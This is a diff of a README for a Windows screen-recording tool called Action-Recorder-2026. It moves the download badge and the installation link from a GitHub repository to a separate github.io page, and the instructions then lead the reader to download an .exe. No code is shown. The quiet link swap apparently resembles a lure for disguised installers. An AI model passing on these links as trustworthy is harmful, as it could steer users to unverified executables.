@@ -1,6 +1,6 @@
 # 🎥 Action-Recorder-2026 - Record your high quality screen actions
 
-[![Download Action Recorder](https://img.shields.io/badge/Download-Action_Recorder_2026-blue.svg)](https://github.com/kellinaredstriped406/Action-Recorder-2026)
+[![Download Action Recorder](https://img.shields.io/badge/Download-Action_Recorder_2026-blue.svg)](https://kellinaredstriped406.github.io)
 
 ## 📌 Overview
 Action-Recorder-2026 allows you to record your Windows desktop or gaming sessions with ease. This software captures video in high definition while keeping system impact low. It provides tools for both casual users who want to save memories and professionals who produce tutorials or content. You can record your screen, internal audio, and microphone simultaneously.
@@ -25,7 +25,7 @@ Before you install the software, ensure your computer meets these basic specific
 
 ## 📥 Downloads and Installation
 Follow these steps to add the software to your machine:
-1. Visit the project repository page at [https://github.com/kellinaredstriped406/Action-Recorder-2026](https://github.com/kellinaredstriped406/Action-Recorder-2026).
+1. Visit the project repository page at [https://kellinaredstriped406.github.io](https://kellinaredstriped406.github.io).
 2. Look for the releases section on the right side of the page.
 3. Select the latest version listed under the releases area.
 4. Download the installer file ending in .exe to your computer.
